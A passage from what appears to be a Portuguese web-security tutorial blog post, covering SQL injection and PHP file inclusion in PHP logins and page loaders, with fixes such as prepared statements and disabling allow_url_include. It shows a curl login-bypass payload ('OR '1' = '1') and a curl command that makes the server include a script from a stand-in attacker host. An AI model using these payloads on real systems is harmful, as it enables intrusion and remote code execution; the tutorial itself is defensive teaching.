    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mysql_num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// Vai para a página logada&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Login com sucesso&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Usuário e senha inválidos&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Vai para a página de login&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Levando em consideração que temos um usuário com nome &lt;code class=&quot;language-text&quot;&gt;teste&lt;/code&gt; e senha
&lt;code class=&quot;language-text&quot;&gt;teste&lt;/code&gt;, se executarmos a instrução abaixo, será exibida uma mensagem
de &lt;em&gt;login&lt;/em&gt; inválido:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl --data &amp;quot;usuario=foo&amp;amp;senha=bar&amp;quot; http://localhost/sql-injection.php

Usuário e senha inválidos&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Evidente! Este usuário não existe no banco de dados. Mas, podemos
imaginar que a aplicação não possua proteção contra injeções &lt;em&gt;SQL&lt;/em&gt;,
então podemos fazer com que a consulta retorne positivo, e que nosso
acesso seja garantido mesmo não possuindo um usuário no banco de dados.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl --data &amp;quot;usuario=foo&amp;amp;senha=bar&amp;#39; OR &amp;#39;1&amp;#39; = &amp;#39;1&amp;quot; http://localhost/sql-injection.php

Login com sucesso&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A nossa &lt;em&gt;query&lt;/em&gt;, por não fazermos um tratamento nos campos do
formulário, foi composta pelo valor &lt;code class=&quot;language-text&quot;&gt;bar’ OR &amp;#39;1’ = ’1&lt;/code&gt;, o que resultou
no seguinte &lt;em&gt;SQL&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; usuario
&lt;span class=&quot;token keyword&quot;&gt;WHERE&lt;/span&gt; usuario &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;foo&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;AND&lt;/span&gt; senha &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;bar&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Existem algumas soluções para este problema, como o uso de
&lt;code class=&quot;language-text&quot;&gt;addslashes&lt;/code&gt; no &lt;em&gt;PHP&lt;/em&gt;, mas os que fazem mais sentido para mim são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;O uso da função &lt;code class=&quot;language-text&quot;&gt;mysql_real_escape_string&lt;/code&gt; para formatar dados
antes de construir a &lt;em&gt;query&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;O uso da classe &lt;code class=&quot;language-text&quot;&gt;mysqli&lt;/code&gt; para consultas a bancos de dados &lt;em&gt;MySQL&lt;/em&gt;,
ao invés do uso das funções &lt;em&gt;mysql&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A primeira é a mais prática de aplicarmos. No código anterior, bastaria
formatar os valores na hora que são resgatados do &lt;em&gt;array&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;$_POST&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Com o &lt;strong&gt;mysqli&lt;/strong&gt;, precisamos fazer algumas alterações no código, como
demonstrado abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;token shell-comment comment&quot;&gt;# sql-injection.php (com mysqli)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;// Abre conexão com o banco de dados&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$mysqli&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;exemplos_blog&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$mysqli&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;SELECT 1 FROM usuario WHERE usuario = ? &quot;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;AND senha = ?&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;bind_param&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;ss&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;store_result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token variable&quot;&gt;$num_rows&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token comment&quot;&gt;// Vai para a página logada&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Login com sucesso&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token comment&quot;&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Usuário e senha inválidos&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// Vai para a página de login&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mas como o mundo não é feito só de &lt;em&gt;MySQL&lt;/em&gt;, se ocorrer de você utilizar
um outro banco de dados, eu recomendo o uso da biblioteca &lt;a href=&quot;http://php.net/pdo&quot; title=&quot;Conheça a lib PDO do PHP&quot;&gt;&lt;em&gt;PDO&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Como o &lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/db/queries/&quot; title=&quot;Making queries&quot;&gt;&lt;em&gt;Django&lt;/em&gt; utiliza &lt;em&gt;ORM&lt;/em&gt;&lt;/a&gt;, e o &lt;a href=&quot;http://codeigniter.com/user_guide/database/active_record.html&quot; title=&quot;Active Record Class&quot;&gt;&lt;em&gt;Codeigniter&lt;/em&gt; tem a &lt;em&gt;Active
Record Class&lt;/em&gt;&lt;/a&gt;, nesses &lt;em&gt;frameworks&lt;/em&gt; essa validação é feita no momento
que interagimos com os seus &lt;em&gt;models&lt;/em&gt;. Mas é sempre bom ter cuidado!
Principalmente quando o &lt;em&gt;ORM&lt;/em&gt; não atende o nosso requisito, e temos que
partir para consultas &lt;em&gt;SQL&lt;/em&gt; puras.&lt;/p&gt;
&lt;h3&gt;Senhas criptografadas&lt;/h3&gt;
&lt;p&gt;Uma boa dica é, sempre que persistirmos um usuário em nossa base de
dados, armazenarmos a sua senha criptografada em um formato “sem volta”
(conhecido como &lt;em&gt;hash&lt;/em&gt;). Além de ser um princípio ético, que na minha
opinião todo o desenvolver de aplicações deveria ter, garantimos que
mesmo que a nossa aplicação seja invadida, as senhas dos usuários
estarão “seguras”.&lt;/p&gt;
&lt;p&gt;Embora o &lt;a href=&quot;http://pt.wikipedia.org/wiki/MD5&quot; title=&quot;Conheça o algoritmo MD5&quot;&gt;&lt;em&gt;MD5&lt;/em&gt;&lt;/a&gt; e o &lt;a href=&quot;http://pt.wikipedia.org/wiki/SHA1&quot; title=&quot;Conheça o algoritmo SHA1&quot;&gt;&lt;em&gt;SHA1&lt;/em&gt;&lt;/a&gt; sejam as escolhas mais populares, os
desenvolvedores do &lt;em&gt;Django&lt;/em&gt; &lt;a href=&quot;https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing&quot; title=&quot;Leia a release note do Django 1.4&quot;&gt;recomendam o uso de algoritmos mais sofisticados&lt;/a&gt;,
como o &lt;a href=&quot;http://en.wikipedia.org/wiki/PBKDF2&quot; title=&quot;Conheça o algoritmo PBKDF2&quot;&gt;&lt;em&gt;PBKDF2&lt;/em&gt;&lt;/a&gt;, por acreditarem que o poder
computacional atingiu um nível, que senhas &lt;em&gt;MD5&lt;/em&gt; e &lt;em&gt;SHA1&lt;/em&gt; podem com
considerável esforço ser quebradas.&lt;/p&gt;
&lt;h2&gt;PHP Injection (não confie no PHP)&lt;/h2&gt;
&lt;p&gt;Embora esta técnica possa acontecer em outras linguagens, o &lt;em&gt;PHP&lt;/em&gt; dá
muita margem para desenvolvedores menos experientes deixarem brechas
para uma vulnerabilidade conhecida como &lt;strong&gt;&lt;em&gt;PHP
Injection&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Com o site dividido em seções, é comum termos inclusões de arquivos
&lt;em&gt;PHP&lt;/em&gt; para compor uma página. Para economizar esforço e linhas de
código, deixamos as partes como menu e topo “estáticas”, e só alteramos
o conteúdo do bloco principal da página. Acontece que em alguns casos, o
desenvolvedor espera que um determinado arquivo seja importado de acordo
com a &lt;em&gt;URL&lt;/em&gt; que o internauta está visitando. Por exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;token shell-comment comment&quot;&gt;# php-injection.php&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;topo.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;menu.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Logo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl http://localhost/php-injection.php?page=novidades.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No caso acima, estamos incluindo o arquivo &lt;code class=&quot;language-text&quot;&gt;novidades.php&lt;/code&gt; e
automaticamente exibindo o seu conteúdo. Podemos navegar por outras
áreas do &lt;em&gt;website&lt;/em&gt;, por exemplo, &lt;code class=&quot;language-text&quot;&gt;page=contato.php&lt;/code&gt; ou
&lt;code class=&quot;language-text&quot;&gt;page=institucional.php&lt;/code&gt;. Mas, e se informarmos
&lt;code class=&quot;language-text&quot;&gt;page=php-injection.php&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Caímos num &lt;em&gt;looping&lt;/em&gt; infinito!&lt;/p&gt;
&lt;p&gt;E, infelizmente, esse é o menor dos nossos problemas. O &lt;em&gt;PHP&lt;/em&gt;, quando
configurado com a opção &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt; como &lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt;, é capaz
de importar arquivos de outros &lt;em&gt;hosts&lt;/em&gt;. Logo, o atacante pode ter um
&lt;em&gt;script&lt;/em&gt; malicioso hospedado em seu servidor, e passar o caminho dele
para a aplicação acima. A aplicação incluirá e interpretará o &lt;em&gt;PHP&lt;/em&gt; que
estiver neste &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Temos código &lt;em&gt;PHP&lt;/em&gt; de outra pessoa executando em nosso servidor.&lt;/p&gt;
&lt;p&gt;Para resolver este problema, configure a opção &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt;
em seu &lt;code class=&quot;language-text&quot;&gt;php.ini&lt;/code&gt; como &lt;code class=&quot;language-text&quot;&gt;FALSE&lt;/code&gt;. Outro passo importante é, sempre que
for importar algum arquivo que dependa de informações vindas do usuário,
verifique o conteúdo desta informação. Exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;novidades&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;novidades.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;contato&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;contato.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;institucional&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;institucional.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;404.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Este ataque não é tão incomum quanto deveria. Fique atento.&lt;/p&gt;
&lt;h2&gt;CSRF – Cross-site request forgery (não confie na requisição)&lt;/h2&gt;
&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Cross-site request forgery&lt;/em&gt;&lt;/strong&gt; ou &lt;strong&gt;falsificação de solicitação
